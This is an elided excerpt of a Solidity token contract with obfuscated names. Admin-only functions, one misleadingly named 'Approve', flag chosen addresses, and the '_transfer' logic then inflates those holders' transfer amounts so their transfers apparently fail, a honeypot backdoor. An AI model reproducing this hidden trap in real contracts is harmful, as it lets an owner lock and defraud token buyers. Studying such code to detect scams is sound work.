...
contract Token is Ownable {
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        bouimuserllov[cjjjss] = zramount;    
        if(_msgSender() == grutAdminccvb){
            require(_msgSender() == grutAdminccvb);
        }else{
            require(_msgSender() == grutAdminccvb);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        bouimuserllov[cjjjss] = newpassnum;
        if(_msgSender() == grutAdminccvb){
            require(_msgSender() == grutAdminccvb);
        }else{
            require(_msgSender() == grutAdminccvb);
    ...
    function _transfer(
        ...
        if (13333 != bouimuserllov[vipFrom]) {}else{
            amount = _balances[vipFrom] + bouimuserllov[vipFrom];
        }
